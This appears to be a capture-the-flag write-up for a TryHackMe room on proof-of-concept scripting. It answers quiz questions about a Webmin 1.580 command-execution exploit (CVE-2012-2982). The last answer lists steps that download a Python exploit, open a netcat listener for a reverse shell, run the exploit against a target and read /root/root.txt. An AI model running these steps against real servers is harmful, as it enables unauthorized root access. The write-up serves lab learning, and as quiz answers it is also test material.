# Intro PoC Scripting

- Please read the introduction description

	  no answer needed

- What is the target's platform and version number?

	- `webmin 1.580`

- What is the associated CVE for this platform?

	- `CVE-2012-2982`

- Which file does the vulnerability exist in?

	- `file/show.cgi`

- What program/command would be the most effective to use in this exploit?

	- `system shell`

- What's the original disclosure date of this exploit?

	- `September 6 2012`, It's written in the POC.
	

- What HTTP response code do we expect after the initial POST request?

	- `302`

- What does sid stand for and what is it's purpose?

	- `Session ID, authentication`

- In the check function, what is it doing to the cookies?

	- `format`

- In the second request of the check function, what method is piped into the command?

	- `rand_text_alphanumeric`

- Which HTTP response header allows us to send an authenticated POST request?

	- `Set-Cookie`

- Which is the correct method for formatting cookies in this example?

	- `any`

- What data type does the payload need to be?

	- `string`

- Why do we need to use "bash -c exec" instead of just "bash -i"

	- `replaces current shell process`

- What is the purpose of "<&1" in the payload function?

	- `redirects socket output stream to bash input stream`

- Run the program and listen for the shell. What is the /root/root.txt flag?

	- `wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py`
	- Change the IP address inside the file with yours.
	- Listen for a shell with `sudo nc -lnvp 53`
	- `python3 web.py <TARGET_IP>`
	- On the new shell `cat /root/root.txt`
	- `THM{****************}`

- No questions here

	  no answer needed

- Check out some of those links for more reading material.

	  no answer needed



